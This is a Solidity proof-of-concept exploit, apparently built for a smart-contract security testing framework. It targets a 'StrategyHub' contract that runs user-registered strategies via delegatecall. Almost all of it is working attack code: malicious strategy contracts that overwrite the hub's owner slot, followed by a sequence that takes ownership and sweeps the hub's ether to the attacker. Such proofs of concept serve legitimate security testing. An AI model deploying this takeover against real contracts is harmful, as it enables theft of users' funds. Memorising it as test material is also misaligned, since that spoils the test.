// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {StrategyHub} from "../src/StrategyHub.sol";

/// @notice A strategy that makes its creator the owner of the hub when the hub runs it. It runs in
///         the hub's context, so its first variable is the hub's `owner`.
contract OwnerTakingStrategy {
    address private owner;
    address private immutable newOwner;

    constructor(address newOwner_) {
        newOwner = newOwner_;
    }

    function harvest() external {
        owner = newOwner;
    }
}

/// @notice The same strategy, with the marker that a hub may ask a strategy for.
contract MarkedOwnerTakingStrategy {
    address private owner;
    address private immutable newOwner;

    constructor(address newOwner_) {
        newOwner = newOwner_;
    }

    function isStrategy() external pure returns (bool) {
        return true;
    }

    function harvest() external {
        owner = newOwner;
    }
}

/// @notice `delegatecall` to a target the caller chooses: any account can register any contract as
///         its strategy, and `harvest` runs it with the hub's storage, so the strategy can
///         rewrite the owner.
/// Knobs:
///   0 `marked`     0: the attacker's strategy has no `isStrategy` marker; 1: it has one;
///   1 `sweep_bps`  the part of the hub that is swept after the takeover, in basis points.
/// The attacker owns no role in the hub, which holds 10 ether.
contract StrategyHubTakeoverPoC is AssayPoC {
    uint256 private constant BPS = 10_000;

    StrategyHub internal hub;

    function setUpTarget() internal override {
        hub = new StrategyHub();
        address donor = makeAddr("donor");
        vm.deal(donor, 10 ether);
        vm.prank(donor);
        (bool funded,) = address(hub).call{value: 10 ether}("");
        require(funded, "funding failed");

        declareAttackerBalance(0.01 ether, 0, 1 ether);
        declareKnob(0, "marked", 0, 0, 1);
        declareKnob(1, "sweep_bps", BPS, 1, BPS);
    }

    function exploit() internal override {
        uint256 balanceBefore = attacker.balance;
        address strategy = knob(0) == 0
            ? address(new OwnerTakingStrategy(attacker))
            : address(new MarkedOwnerTakingStrategy(attacker));

        vm.startPrank(attacker);
        hub.setStrategy(strategy);
        hub.harvest();
        hub.sweep(payable(attacker), address(hub).balance * knob(1) / BPS);
        vm.stopPrank();

        attacker_profit("eth", balanceBefore, attacker.balance);
    }
}
